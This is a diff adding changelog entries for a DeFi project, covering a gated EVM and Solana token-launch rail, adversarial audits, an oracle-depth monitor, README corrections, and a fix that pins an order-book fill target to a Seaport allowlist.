+  rather than a bare string and `String(result)` was yielding `"[object Object]"`;
+  `useOneClickStake` and `useOneClickLaunchBuy` both normalize through it. And LaunchPage's
+  `trackPageView` moved out of `useMemo` — a side effect in render, which **double-fires under
+  React 19 StrictMode** — into `useEffect`. LaunchPage's stepper was also wrapped in
+  `overflow-x-auto` with `shrink-0` and `whitespace-nowrap` so it never overflows narrow
+  viewports.
+
+### Added — An EVM token launcher on Doppler's Airlock: built from nothing, fork-verified, and left switched off (2026-07-17 → 2026-07-18)
+
+Seventeen commits, `c717938d` → `cd780e3c`, all pushed direct to trunk. **Everything here
+landed with `isLauncherEnabled()` false and `LAUNCHER_INTEGRATOR_ADDRESS` at zero**; this is
+the rail the 2026-07-22 GO LIVE entry above then un-gated.
+
+- **Strategy and an on-chain-verified foundation** (`c717938d`). Integrate Doppler's deployed
+  mainnet Airlock as the V4-native launch engine — **BUSL, so integrate, never fork** —
+  graduate into our own V4 stack, and make the Launch Afterlife the defensible centrepiece.
+  Hardened by a 42-agent adversarial red-team, which **cut v1's gauge-featuring centrepiece**
+  outright. Verified on-chain at block 25553318: the full launch→graduate module set
+  (DopplerERC20V1Factory / UniswapV4Initializer / UniswapV4Migrator) is whitelisted on the
+  mainnet Airlock, **so launches need no Whetstone approval**. The first four files were the
+  canonical addresses, a **disclosure-only Fact-Sheet model explicitly not framed as a
+  "certificate"**, and a pure two-tier automated gate — code, not opinion — with 20 tests
+  including adversarial edge cases and disclosure neutrality.
+- **The collector defaults closed** (`a4f98a69`). `collector.ts` turns a token address into
+  `RawTokenFacts` with EIP-1167 provenance detection: powers are proven-false by template for
+  known Doppler clones and **conservative — defaults closed — for unverified templates, so the
+  gate never vouches for an unaudited contract.** An injectable `LockResolver` keeps LP-lock
+  reads composable and testable.
+- **Ordering that cannot take money** (`579497a0`), the replacement for the cut paid-featuring
+  idea. `LaunchSummary` **has no boost, promoted or paid field, so no money can enter the
+  score** — the surface is structurally unable to be paid for rank. The formula is published
+  verbatim (tier weight + recency + log-scaled capped activity, ties broken by token address)
+  and deterministic. `outcomes.ts` surfaces liquidity drain, unlock-dump and abandonment as
+  **disclosed market-risk outcomes in factual, non-editorial wording — never "rug" or "safe"**
+  — on the stated principle that a disclosed dump is an outcome, not a safety incident.
+- **Five constraints learned from an anvil mainnet fork** (`376ece39`). Running the real
+  doppler-sdk `createDynamicAuction` through our policy proved the integration is real —
+  `simulateCreateDynamicAuction` returned a valid deployed token, `getAddresses(1)` matched
+  our constants **byte-for-byte**, and the airlock owner `0x21E2…7A66` plus the 5%
+  protocol-beneficiary default were both confirmed. Each revert taught a constraint, now
+  encoded: dynamic auctions need `tickSpacing <= 30` (`InvalidGamma` / `MAX_TICK_SPACING`);
+  market cap is `{start, min}` and descends Dutch-style, not `{start, end}`; the numeraire
+  defaults to native ETH and **WETH reverts `InvalidTokenOrder()`**; beneficiaries must include
+  the Airlock owner at ≥5% (`InvalidProtocolOwnerBeneficiary`); and a `startTimeOffset` buffer
+  is required or the hook reverts `InvalidStartTime()` when `block.timestamp` passes the
+  build-time start before the transaction mines.
+- **Two things the green fork launch then exposed** (`eef9dba3`). Real Doppler tokens deploy as
+  **Solady `LibClone` proxies, not canonical EIP-1167**, so the collector's `eip1167Target`
+  **recognised zero real launches** and defaulted the gate closed for every one of them;
+  `cloneImplTarget` now parses both layouts, with a test over the exact bytecode observed on
+  the fork. And the SDK default deployed a `StandardToken`, **not** the verified-safe template,
+  so `type:'dopplerERC20V1'` is pinned to the audited no-mint / no-tax / pool-lock / vesting
+  template the gate whitelists. `79975643` recorded the end-to-end validation on a drpc
+  mainnet fork: the launch mined green, the token is a Solady clone of DopplerERC20V1,
+  `isPoolLocked()` true — **the full airlock → launch → collector → gate loop validated against
+  live fork state.**
+- **A tier bug the unit tests missed** (`831945ea`). Visual QA in the browser, with the gate
+  opened locally, caught the wizard converting "12 months" at a flat 30 days/month = **360
+  days, under the gate's 365-day flagship LP-lock floor** — so selecting Flagship with a
+  12-month lock silently produced a merely LISTABLE Fact Sheet. Months now convert at 365/12,
+  and the gate was re-locked and re-verified after the fix.
+- **The fee constitution** (`e37218e8`): **1% total (fee tier 10000)**, split Doppler 5 /
+  Tegridy 15 / creator 70 / attention 10, with `LAUNCH_FEE_TIER=10000` as the single source for
+  the 1%. The reasoning is on the record as research-backed rather than arbitrary: the commit
+  argues fee cuts do not buy share (citing BonkFun's 0.3% losing to pump.fun's 1.25%), so the
+  rate sits at standard rather than below; Doppler's 5% is a fixed floor enforced in code;
+  Tegridy's 15% is **deliberately below Clanker's 20% survivor ceiling**, because the Afterlife
+  economy is the draw and not the cheapest fee; and the creator-directed 80% carries a
+  Bags-style carve-out to attention-holders as the proven cheap distribution lever.
+- **Live submit, EAS attestation and KOL splits** (`0d8a37d4`, `e8471c2c`, `ec380923`). "Review
+  & launch" drives a real `createDynamicAuction` through the fork-verified
+  `buildTegridyLaunchParams`, with the gate and integrator guarded **before any chain access**
+  and fee-constitution roles resolved to addresses and coalesced into the unique beneficiaries
+  `StreamableFeesLocker` requires (sum 1e18, Doppler ≥5%). `attestation.ts` writes a Fact Sheet
+  as an on-chain EAS attestation using viem only — **no new dependency** — with a deterministic
+  schema UID, ABI-encoded flat fields and a keccak `disclosuresDigest` over canonical JSON,
+  simulate-then-attest with the token as recipient. Attention beneficiaries are added as
+  address+% rows carved out of the creator's 80% pool with a live "you keep X%" readout;
+  over-allocation throws, addresses are coalesced, and the total still sums to 10000.
+- **Premine was refused before it was made real.** In `0d8a37d4` premine is **refused outright**
+  — because without on-chain vesting the Fact Sheet would claim "vested" for un-vested tokens
+  — and the team-allocation slider is disabled to match, fair-launch only. `27419392` then
+  wired Doppler's `withVesting`, locking the reserved remainder
+  (`initialSupply - numTokensToSell`) to the creator under a real schedule **so the Fact
+  Sheet's "vested" is truthful rather than a promise**, replacing the honesty guard with a 20%
+  policy cap plus positive-vest and cliff ≤ duration validation.
+- **A one-click atomic buy, framed as the opposite of a bundler** (`bb062367`, with the
+  research in `c028597f`). `buildLaunchBuyCalls()` composes an EIP-5792 batch around an
+  SDK/Quoter-produced V4 swap call — native path `[swap w/ value]`, WETH path
+  `[approve EXACT amountIn → router] + [swap]` — and **deliberately does not hand-roll V4
+  UniversalRouter calldata**, which is the Doppler SDK's job. Exact approve, never infinite;
+  `swap.to` forced to equal the router; native/WETH value mismatches rejected;
+  capability-gated *and* launcher-gated, with a sequential fallback, and purely additive so it
+  never replaces the existing flow. The stated position is that **a single-address,
+  one-signature, fully-disclosed atomic batch *is* the anti-bundler transparency feature**, and
+  the accompanying research declines multi-wallet "bundling" and wash "volume" on the record,
+  citing DOJ Operation Token Mirrors, CEA §4c(a)/CFTC, the pump.fun statutory-seller class
+  action (1:25-cv-00880) and MiCA Art. 91.
+- **Outcomes, afterlife and discovery, all seams rather than surfaces** (`8a0f36d3`,
+  `27419392`, `68e4d0fb`). The outcomes reader sits behind a mockable fetcher over
+  GeckoTerminal (keyless) and Etherscan (server-side key), wired through the aggregator
+  catchall as `?resource=launcher-outcomes` with a lazy import, **so no new serverless function
+  was added against the 12-function cap**. `afterlife.ts` maps a graduated launch to
+  `TegridyBoostedLPStaker` deploy params against the real 5-arg constructor, with honestly
+  gated eligibility — a zero V4 PositionManager or GaugeController reports
+  *pending-deployment*, **never faked live** — and enforces `currency0 < currency1`, since an
+  unsorted key yields a PoolId matching no pool and a bricked staker. The deployed
+  GaugeController `0x6c79…1054` was wired into a **new launcher-local `constants.ts` rather
+  than the app-global address**, because the global has no separate enable flag and would have
+  lit up gauge-voting UI while ownership still sat on the flagged Safe. A GeckoTerminal
+  discovery mapper was built and **left unwired on the stated grounds that there is nothing to
+  list until a launch exists**, and the collector finally got the read-only viem `ChainReader`
+  **the file had falsely claimed already existed**.
+- **One disclosure-integrity fix deserves naming on its own** (`8a0f36d3`, marked
+  CRITICAL in the commit). A failed or rate-limited market fetch was collapsed to 0, which
+  `deriveOutcomeFlags` then read as a fabricated **−100% crash and a 100% liquidity drain for
+  healthy launches**. Unobserved is now distinguished from observed (mirror baseline plus
+  `marketObserved:false`, rendered as "unavailable"), and `buildLaunchSummary` returns null on
+  an outage **so a launch keeps its prior rank instead of being deranked to zero** — and **the
+  test that had baked in the bug was flipped.**
+- `cd780e3c` closed the last deferred item from the frontend audit: the KOL attention-split
+  percentage input re-derived its controlled value from rounded bps on every keystroke
+  (`value={String(row.shareBps/100)}`), **so typing "1." immediately snapped back to "1" and
+  fractional splits were impossible to enter.** The row was extracted into
+  `AttentionSplitRow` with a local text buffer that resyncs only on *external* bps changes,
+  never mid-typing.
+
+### Added — A Solana launch rail on Meteora's DBC, fee-capture only and gated (2026-07-17 → 2026-07-18)
+
+Built alongside the EVM rail and gated throughout (`SOLANA_LAUNCHER_ENABLED=false`).
+
+- **A pure parameter builder first** (`0d8a37d4`, `solana/dbc.ts`): Meteora DBC partner config
+  with anti-snipe fee decay from 99% down to 1%, a creator-majority split, an immutable token
+  and DAMM-v2 migration, plus launch and partner fee-claim. **The doctrine is enforced in code,
+  not just in copy: fee capture only, no TOWELI on Solana, zero Rust** — the SDK import is
+  type-only, so it carries zero runtime weight.
+- **The custody risk is in `claimPartnerTradingFee`**, and it is contained by a `SquadsVault`
+  brand plus an `asSquadsVault` runtime gate on **both** `feeClaimer` and `receiver`. A later
+  review (`b9594070`) softened the headline docstring to say plainly that the brand is a
+  **shape-and-affirmation gate, not proof of multisig ownership** — verifying that on-chain is
+  the operator wrapper's job. That same review also enforced two SDK constraints: **≥10%
+  permanently-locked LP** (`MIN_LOCKED_LIQUIDITY`) and `totalDuration` divisible by
+  `numberOfPeriod`, so the decay window is exact. `e8471c2c` then added `verifySquadsVault`
+  and a signing wrapper (`dbcClient.ts`, mapping base58 → `PublicKey`/`BN`), and fixed an
+  agent's `client.pool.createPool` to the real SDK service `client.creator.createPool`.
+- **A correction that mattered** (`27419392`, medium). The real Squads v4 vault is a
+  **SYSTEM-owned PDA**, so the original `owner == Squads` check **rejected the true fee signer
+  and pushed toward a funds-lock**. It now derives the vault PDA from `(multisig, index)` and
+  requires `feeClaimer` to equal it, plus confirms the multisig itself is Squads-owned;
+  provenance is threaded through `dbcClient` as `vaultProvenance` and it fails closed. The
+  commit flags that the seeds should be revalidated against a live multisig at go-live.
+- **An operator signing harness** (`68e4d0fb`, `frontend/scripts/solana-dbc-operator.mjs`) —
+  the first real driver for what had been a zero-caller client wrapper. Commands
+  `create-config` / `launch` / `claim` / `derive-vault`; secrets from ENV or CLI only, nothing
+  committed. It derives the Squads vault PDA and provenance **so a typo'd fee address cannot
+  slip past the on-chain `verifySquadsVault` check**, defaults to PRINT (partial-signed base64
+  for out-of-band Squads co-signing) with `--send` opt-in, and **`claim` can never `--send`**,
+  because the vault signs via `invoke_signed`. `derive-vault` cross-checks byte-for-byte
+  against raw web3.js. A self-contained Node loader runs the bundler-targeted TS graph with
+  zero new dependencies, and the stale `solana/README` operator section — wrong
+  `createPool`/`claim` method names, missing vault-provenance flow — was rewritten.
+- `e8471c2c` also added the gated `SolanaLaunchPage.tsx` sub-brand and the `/solana-launch`
+  route, which the following day got the same honest pre-launch explainer as the EVM rail.
+
+> **Correction, from later work (2026-07-30).** This harness **could not in fact construct a
+> transaction**, which is why nothing had been created on Solana mainnet through it before
+> that fix. The DBC SDK builds every transaction via anchor's `.transaction()`, which returns
+> a bare `Transaction` with no `feePayer` and no `recentBlockhash`, so `partialSign` and
+> `serialize` both threw and every money path — `create-config`, `launch`, `claim` — died
+> there. See the 2026-07-30 "LockerClaimer … and a Solana operator harness that can finally
+> build a transaction" entry.
+
+### Security — The launcher's own adversarial audits, run against work that had not shipped yet (2026-07-17 → 2026-07-18)
+
+Three commits. Everything below was found and fixed **while the rail was still gated**, which
+is the point: the launcher was audited before it could be reached, not after.
+
+- **A three-lens review plus a browser pass over both legs** (`b9594070`; 0 critical, 0 high;
+  the cast seam verified sound against the real SDK). Twelve findings, all fixed, disclosure
+  and mandate ones first: the Flagship blurb dropped **"rug-impossible"** (rendered "rug"
+  framing is forbidden); the gate's "known-safe factory" became "recognised non-upgradeable
+  template factory", dropping the word *safe*; the Fact-Sheet preview now **branches ownership
+  by tier**, so flagship shows "Owner is a timelock contract" rather than a false
+  "renounced"; and a no-premine review row reads "0% (fair launch)" instead of "(vested)".
+  A **partial** market read — one required field non-finite — became UNOBSERVED instead of
+  coercing liquidity to 0 and fabricating a drain. Robustness alongside it: a wrong-chain
+  wallet is refused before any params are built (`chainId !== 1`), and supply, descending
+  market cap and a finite ETH price are validated with build errors surfacing as a typed
+  `LaunchError`. **The gate was reverted to shut after QA.**
+- **A 17-agent adversarial audit of the whole session's launcher and operator work**
+  (`11962306`; 8 attackers, 8 skeptics, synthesis). **0 critical, 0 high, nothing externally
+  reachable at the time** — fee math, the attestation crypto primitives, vault
+  fail-closedness, one-click value handling and the harness's secret handling all held clean.
+  Four mediums were closed before any un-gate:
+  - **Attestation forgery.** `onAttest` now re-collects facts from the **deployed** token via
+    `collectTokenFacts(viemChainReader(publicClient))` and `buildFactSheet`, **never the
+    mutable wizard projection** — closing "deploy 20% insider → set the slider to 0% →
+    attest 0%".
+  - **A Squads 1-of-1.** `verifySquadsVault` proves owner and PDA binding but **not
+    threshold**, and because `@sqds/multisig` is not a dependency the hand-rolled byte-offset
+    parsing could **accept a 1-of-1 rather than fail closed**. A threshold ≥ 2 was documented
+    as a loud hard go-live requirement, with a warning added to the harness's `derive-vault`,
+    to be enforced in code via the Squads SDK at go-live.
+  - **A data-path self-DoS.** Per-request memoized fetchers collapse the 2x record/summary
+    fan-out and a dependency-light limiter caps ~5 requests in flight, **so one POST cannot
+    429-storm the keyless GeckoTerminal feed.**
+  - **A runbook error** in the Safe re-home procedure — see the ownership-windows entry above.
+- **The attestation digest was widened twice, in the same direction.** `27419392` folded
+  `gateChecks`, `totalSupply`, `tokenFactory`, `name` and `symbol` into `disclosuresDigest`,
+  **so a forged audit trail or an inflated supply can no longer survive "verification"**; and
+  `11962306` folded in all remaining flat columns plus `schemaVersion` for whole-sheet
+  tamper-evidence. Related fee-split hardening: an attention split aimed at the protocol or
+  Doppler address is rejected, and fixed roles are preserved symmetrically on merge **so there
+  is no silent skim or mislabel**; `null` and omitted normalise to one form for a stable
+  digest; u64 bounds are re-asserted on operator-built params; `poolByToken` is validated
+  against the pool's base token so there is no cross-attribution; and the gate is checked again
+  inside `attestFactSheet` / `registerFactSheetSchema` as defence in depth.
+
+### Fixed — The launcher-outcomes serverless function shipped to production broken (2026-07-18)
+
+`13fb0969`. The production deploy surfaced a real defect: `/api/aggregator?resource=launcher-outcomes`
+returned **500 FUNCTION_INVOCATION_FAILED**.
+
+The Vercel build log gave the root cause. The API function compiles under `node16` module
+resolution, but it imported `outcomesReader.ts` — a *frontend* file whose extensionless,
+bundler-style imports (`./factSheet`) `node16` rejects with **TS2835** — so **the function
+shipped broken**. This is exactly the `api/` → `src/` boundary hazard the repo had flagged
+earlier.
+
+The fix ports `outcomesReader`'s pure builders (`buildOutcomeRecord` / `buildOutcomeSummary`,
+the normalizers and `safeCall`, all dependency-free) into the API function as plain JS and
+drops the `src/` import, leaving the function self-contained. `outcomesReader.ts` stays the
+unit-tested source of truth and **both copies carry a SYNC note**.
+
+**The endpoint was gated and dormant in production — empty baselines — so no user was
+affected. It would have broken the outcomes dashboard at go-live.** The fix was validated by
+`node --check` plus a clean module load under Node; **the commit leaves the redeploy and the
+endpoint re-test outstanding**, so nothing here claims it was confirmed against production.
+
+### Internal — Operator runbooks, liquidity research, an oracle-safety monitor, and a restaking split design that was deliberately not executed (2026-07-17 → 2026-07-18)
+
+Six commits that deploy nothing and un-gate nothing.
+
+- **The oracle's load-bearing assumption made observable** (`4c7a5f26`). This is the one
+  "wire this" TODO from the core-loop go-live safety verdict (`docs/GOLIVE_CORELOOP.md`
+  condition 3 / B4): **the native TWAP pool is only manipulation-safe while the deeper
+  arb-linked Uniswap pool keeps it honest, and that condition was not being watched.**
+  `contracts/monitoring/arbLinkageMonitor.mjs` compares the WETH depth of the native
+  `TegridyPair` against the deep Uniswap pool and emits GO(0) / WARN(1) / HALT(2) — HALT if
+  Uniswap WETH is under 3x native or native is empty (the signal to emergency-pause the
+  oracle-dependent features: NFT and token lending, `POL.accumulate`), WARN below 4x or below
+  the 1.0-WETH live floor, and a loud ERROR exit on failure rather than a silent pass.
+  Dependency-free raw JSON-RPC on node ≥18, keyless RPC roster with fallback, env-tunable
+  thresholds, `--json` for cron and alerting. **It holds no keys**, and the auto-pause hook
+  that would consume a HALT is a separate operator wire-up. Verified live 2026-07-18: native
+  0.0203 WETH pre-deepen gives WARN (below the floor); post-B1 deepen at ~1.33 WETH the ratio
+  is ~5.5x, giving GO. All three paths and exit codes tested, after fixing a Windows libuv
+  `process.exit` race.
+- **Pre-flight re-read rather than assumed** (`97c14971`). The go-live plan's B0–B4 conditions
+  were re-verified on-chain and **nothing had drifted**: the native pair still holds 776,678
+  TOWELI and 0.0203 WETH; the TWAP floor is still 10 WETH with B0 unstarted; the TWAP owner is
+  still the deployer EOA with the floor functions present; and the Uniswap arb venue sits at
+  7.26 WETH, giving the ~5.5x post-deepen ratio, above the 3x floor. The only owner-side
+  unknown recorded was the signing wallet's balance.
+- **The operator go-live runbook** (`684b002f`) consolidates the whole launcher effort into one
+  handoff: the hard gates (go-live → Safe re-homing → TOWELI liveness), the two operator
+  decisions (integrator multisig, fee numbers), the exact un-gate code steps (config flag,
+  outcomes adapter in the aggregator catchall, V4 PositionManager for afterlife), the
+  fork-verified launch params, pre-launch verification, phase sequencing and kill criteria.
+  **Nothing in it goes live; it is the map for when the gates open.** `79975643` is the
+  companion record of the safe-template green create and the full loop validated end-to-end on
+  a mainnet fork.
+- **Liquidity and one-click-UX research** (`c028597f`): three web-research streams, each
+  adversarially fact-checked against primary sources, with corrections applied and **no
+  fabricated cases, EIPs or addresses**. Part A is the honest version of "volume" — graduate
+  via the Doppler v4 migrator and `StreamableFeesLocker` (config, no Solidity), manage POL with
+  an **integrated audited ALM (Gamma / Arrakis V4 — integrate, not fork; PALM is V3-only)**,
+  and deepen through the existing POL + gauge + boosted-LP flywheel. Part B is the honest
+  version of a "bundler" — the EIP-5792 one-click buy, single-address and fully disclosed,
+  with 7702 scoped as an enabler *and* a hazard, never a raw-7702-auth UI, and a hosted
+  paymaster rather than a custom one. Part C is the receipts for declining the dishonest
+  versions. Sequencing recorded: the one-click buy and the v4-migrator config are buildable at
+  zero audit cost, ALM integration and gasless are later, **manipulation tooling is never**.
+- **A split design deliberately not executed** (`7148898c`). `TegridyRestaking.sol` is **2,629
+  lines, fund-touching, and `forge build` hangs locally so bytecode size cannot be measured** —
+  and **a blind refactor pushed to CI would create false "done" confidence for a fund
+  contract.** So what landed is the actionable split design a later audited effort executes
+  with local compilation, grounded in the real code: the size trajectory (part 1, `58add7a`,
+  took the host 31,399 → 28,680 B, still ~2–4 KB over the 24,576 limit, with CI
+  `forge build --sizes` authoritative); a new `TegridyRestakingAdmin` sister mirroring the
+  proven `TegridyStakingAdmin` / `SwapFeeRouterAdmin` pattern, moving the timelocked
+  propose/execute and the `TimelockAdmin` base out while the host keeps the fund-mutation
+  `applyXxx` bodies; the fund-body boundary; a behaviour-equivalence checklist; the footguns
+  (event relocation, cross-boundary reentrancy defence-in-depth, storage continuity); and an
+  ordered execution checklist **ending in a mandatory external re-audit**. The same commit
+  records that item L2 (aggregator min-out) was already fixed and superseded by R033 H-01
+  (`useSwap.ts:396`), and that a fork spike confirmed launch creates green on current code with
+  the auction pool live and priced on-chain — leaving V4 poolKey reconstruction and
+  UniversalRouter swap encoding as a documented go-live integration with no SDK helper.
+
+### Security — the native order book let a stored row name both the contract called and the recipient of the buyer's ETH (2026-07-18)
+
+`e045cfdf` — committed straight onto `mvp-launch` (single parent `bb93911e`, no `(#N)` in the subject), so there is no PR to cite.
+
+**A native listing row carries its own `protocol_address`, and nothing on either
+side of the wire constrained it.** On the read side,
+[`frontend/src/nakamigos/lib/orderbook.js`](frontend/src/nakamigos/lib/orderbook.js#L133)
+used `order.protocol_address || SEAPORT_ADDRESS` twice inside `fulfillNativeOrder`:
+at `:133` to construct the pre-flight `getOrderStatus` reader, and again at `:159`
+for the `ethers.Contract` the fill goes through — the same contract that `:195`
+hands `{ value: totalWei }`, `totalWei` being the reduce over every consideration
+amount at `:148`. One server-supplied field therefore chose both the callee and
+the payee of the buyer's entire payment.
+
+The write side did not constrain it either.
+[`frontend/api/orderbook.js`](frontend/api/orderbook.js#L642) validated every
+*other* field on that path — currency, price cap, signature recovery, on-chain
+ownership — and then persisted
+`order.protocol_address || "0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC"` verbatim
+out of `req.body` at both insert sites (`:642` single listing, `:890` bundle). A
+row written with a foreign address would be read back and fulfilled through
+`fulfillNativeOrder` like any other listing, and the buyer's wallet would be asked
+to send the full consideration to whatever contract that row named. This is the
+treasury-funding path — `PLATFORM_FEE_BPS = 100`, i.e. 1%, at
+[`constants.js:171`](frontend/src/nakamigos/constants.js#L171) — and it was the
+one being actively promoted that same day by `a937dd11`, which routed gallery buys
+in-app rather than out to OpenSea.
+
+The OpenSea/Seaport sibling path **already had the fix**: it tests `txData.to`
+against a two-entry Seaport set declared at
+[`frontend/src/nakamigos/api.js:1125`](frontend/src/nakamigos/api.js#L1125) and
+aborts five lines later with "Unexpected transaction target — aborting for safety".
+The native path was the weaker of the two twins. Closed with that same allowlist
+rather than a newly invented one:
+
+- [`constants.js`](frontend/src/nakamigos/constants.js#L127) gained
+  `KNOWN_SEAPORT_ADDRESSES` — Seaport 1.5 `0x…ADc04C56Bf30aC9d3c0aAF14dC` and 1.6
+  `0x…68F116a894984e2DB1123eB395`, stored lowercased for case-insensitive lookup —
+  and `resolveSeaportTarget()` at `:138`, which returns `null` for anything else.
+  **Fail-closed by design: an unknown target must make the caller abort, never
+  fall back to the default** — falling back would execute an order whose signed
+  EIP-712 domain disagrees with where the ETH is being sent.
+- `lib/orderbook.js` resolves once and returns the abort *before* the status read,
+  so both contract constructions use the pinned address and neither can see the
+  raw row value.
+- `api/orderbook.js` returns `400 {"error":"Unsupported protocol address"}` at
+  both insert sites, so a poisoned row never reaches storage in the first place.
+
+8 regression tests in
+[`seaportTargetPin.test.js`](frontend/src/nakamigos/lib/seaportTargetPin.test.js)
+pin the fail-closed property rather than the happy path: an attacker address
+(`0x…deadbeef`) returns `null` and — asserted separately, because the two are
+different failures — is `not.toBe(SEAPORT_ADDRESS)`; two lookalikes are refused
+(one hex digit off the real 1.5 address, and right-prefix/wrong-tail); non-address
+junk (`"not-an-address"`, `"0x"`, the *number* `12345`) returns `null` instead of
+throwing; an absent field still defaults to canonical Seaport; and the allowlist
+itself is asserted to hold exactly 2 entries, every one lowercase, so a future
+addition has to be deliberate.
+
+**Pre-existing, not a regression.** Found while adversarially auditing
+`a937dd11` (gallery buys routed in-app, landed three hours earlier the same day),
+which was itself exonerated — 0 findings survived, `Modal.jsx:497-498` is
+byte-identical pre-change, and five other callers were already feeding
+`fulfillNativeOrder` the same raw row. Fixed anyway: "which commit introduced it"
+is the wrong test for a live money-path gap.
+
+### Changed — the README's revenue section described one fee rail where the contracts have two (2026-07-16)
+
+`3a59d3f9` — the flywheel prose and diagram were re-grounded against `SwapFeeRouter`, `RevenueDistributor` and `TegridyPair`, with the contracts read as the source of truth rather than the docs. Two structural corrections:
+
+- **The two swap-fee rails had been collapsed into one.** A raw swap on the native `TegridyPair` charges 0.3%: roughly 0.25% grows the pool for LPs, and the ⅙ protocol slice (~0.05%) accrues to `feeTo` **as LP tokens — a treasury asset, not staker ETH**. Only the smart front-door (`SwapFeeRouter`, 0.5%, hard-capped at 1%) is collected in ETH and earmarked for the staker rail, at the whole of that amount by default with a governance floor of 50%. The old text and diagram implied that every swap fee ended up on the staker rail, in ETH. The rewrite splits the rails into a table and adds a worked example: 1 ETH through the front door skims **0.005 ETH**, while the same 1 ETH traded directly on the native pair yields stakers nothing in ETH at all.
+- **"Continuous stream" was never the mechanism.** Payout is epoch-based and throttled — an epoch opens only once **≥ 1 ETH** of fees has pooled *and* **≥ 4 hours** have passed since the last one — with a pull-based `claim()`, and each epoch measures stake at the previous second so nobody can flash-stake into a payout. A plain three-step "how you get paid" replaced the stream language, and the tokenomics revenue/treasury bullets were aligned to the same facts.
+
+The diagram now draws the live front-door path solid and the lending / NFT-pool / launchpad / premium paths dashed and labelled "not flowing", so a gated surface no longer renders as a live revenue source. The commit also records re-checking the `REVENUE_ANALYSIS.md` link an audit agent had reported broken: **it was not broken — a false positive**, and the line was left untouched.
+
+### Changed — the README still listed eleven contracts as not-yet-deployed after they went on-chain, and three more claims lagged the deployed set (2026-07-16)
+
+`00ffd42e` — the status banner, the 30-second version and the live-deployment-status list now record that the audited gated-feature batch was **deployed to mainnet and Etherscan-verified on 2026-07-16**: GaugeController `0x6c79…1054`, VoteIncentives `0x6e1d…21AF` (+ Admin `0xf87E…B300`), PremiumAccess `0x9DC2…A3f5`, TegridyNFTPoolFactory `0xbB8E…6F5B`, TegridyNFTLending `0x89Be…f14F` (+ Admin `0x6937…0a9C`), MemeBountyBoard `0x6D2C…d890`, CommunityGrants `0xeBC3…D471`, TegridyLaunchpadV2 `0xa614…0dF7` and its TegridyDropV2 template `0xA35e…e872`. Alongside it:
+
+- A new **🔵 On-chain** state was added to the feature table so "deployed and verified but still frontend-gated pending the Safe ownership handoff" stops reading as "not deployed". 🟡 Gated now means only *not yet deployed*, with `TegridyLending` footnoted as the one on-chain-batch member that is still oracle-gated.
+- The native pool moved from "seeding pending" to **seeded but shallow** — it holds live liquidity at market price, but the TWAP bootstrap is still gated on deepening it past the oracle's reserve floor, so the roadmap gate became `DeepenLP.s.sol` → `BootstrapTWAP.s.sol` rather than `SeedLP.s.sol`.
+- Test-file count corrected 95 → 100+ (the commit puts the actual number at ~103), and the security section now cites the 2026-07-16 pre-deploy audit waves plus a dedicated TegridyLending re-audit at 0 Critical/High/Medium/Low.
+
+`b9c31f64` — a full reconciliation of the README against the on-chain deployed set (the `DeployMVP` broadcast, `constants.ts`, and the gated-batch deploy) then caught three more defects:
+
+- **`TegridyStakingJbacVault` `0x2831…3f14` was missing from the address list entirely** — a deployed MVP contract with no README row.
+- The V4 line implied nothing V4 existed on-chain. Its fee hook `0xB6cf…0044` **is** pre-deployed at a mined address; only the swap surface is gated pending its audit wave.
+- The user-guide line read "**Vote on gauges** — coming online with the governance surface (currently gated)", which is wrong about what is pending: `GaugeController` and `VoteIncentives` are deployed on-chain, and what remains is the ownership handoff, not the deploy.
+
+### Fixed — the NFT-recovery sweep claimed a bound it did not have, and the scan behind it could gas-brick (2026-07-14 → 2026-07-16)
+
+A correction of a documented belief, then the fix it deferred.
+
+`4ec2e1d0` — `TegridyLending.sweepUnsolicitedNFT`'s NatSpec said its active-loan gate was "bounded by `MAX_TOTAL_OFFERS`". **That claim had been false since `3f87bd8` replaced the lifetime offer cap with a live counter**: `MAX_TOTAL_OFFERS` caps `activeOfferCount`, not `loans.length`, and `loans[]` is append-only (its sole mutation is `loans.push`; there is no pop). The real bound is O(lifetime-loans), and the commit records this onlyOwner recovery path gas-bricking past roughly 2–3k lifetime loans. The comments were corrected to the true bound and the fix flagged for the contract's oracle-gated deploy window. Confirmed LOW: no principal or collateral is at risk, and an unsolicited NFT is by definition never loan collateral.
+
+`0f4ca29a` — the deferred fix landed before that deploy window. The scan is replaced by an **O(1) reverse index `collateralEscrowLoanIdPlus1[collection][tokenId]`**, storing `loanId + 1` so `0` unambiguously means "not held as collateral". It is set in `acceptOffer` only after the `ownerOf` post-check confirms the inbound escrow, and cleared **only when the NFT physically leaves** — the `moved == true` branch of repay and of default, and `claimStuckCollateral`. A stuck-but-unresolved collateral therefore keeps its slot, which is exactly the retired scan's "active-loan OR stuck-reserved ⇒ in use" semantics rather than an approximation of it.
+
+- A fail-closed `revert CollateralInUse()` on a non-zero slot is unreachable against an honest ERC-721 — the inbound `transferFrom` would already have reverted — and exists so a **whitelisted-then-malicious collateral that lies about `ownerOf`** cannot silently overwrite a still-live reservation and let the single-slot index diverge from the retired scan.
+- **The sweep had zero test coverage.** `contracts/test/TegridyLending_SweepIndex.t.sol` was added with the change.
+- An adversarial pre-deploy audit (six dimensions, dual-refute) returned 0 Critical/High/Medium/Low; its sole Info note was this index's own design edge, confirmed benign against the post-edit code. The `DeployTegridyLending` dry-run compiles and simulates clean at ~0.0024 ETH of gas.
+
+### Fixed — a live gated-batch broadcast aborted after its transaction had already mined, and a dry-run deployed the launchpad to the wrong owner (2026-07-15)
+
+- `298f3725` — **a live broadcast aborted on contract 4 of 8 after that contract's transaction had already landed on-chain.** The Flashbots relay's receipt-poll rate limit returned 429 and `forge` exited non-zero with the deploy already mined. These are plain `CREATE` deploys with no sandwichable action in them, so the broadcast RPC now defaults to the public mempool and Flashbots became opt-in (`BROADCAST_RPC=flashbots`), reserved for the transactions that actually are sandwichable — the LP deepen and the TWAP bootstrap. `START_AT=N` resumes the run from a given contract, and a failed broadcast auto-retries **up to five times with `--resume`, eight seconds apart**, so the driver finds the mined transaction instead of deploying a duplicate. A dry-run failure is never retried, because a dry-run failure is real.
+- `d3b0292c` — `--account` alone leaves the script-level `msg.sender` as Foundry's `DefaultSender` in a dry-run. `DeployLaunchpadV2` reads `msg.sender` as the initial owner, so it deployed with `owner = DefaultSender` and then reverted `transferOwnership` with `OwnableUnauthorizedAccount`. `--sender 0x1489…456E` is now baked into `COMMON` unconditionally, and `SIGNER` became the signing method only — optional for a dry-run, required for `--broadcast`. Re-verified with all 8 scripts simulating clean, LaunchpadV2 included.
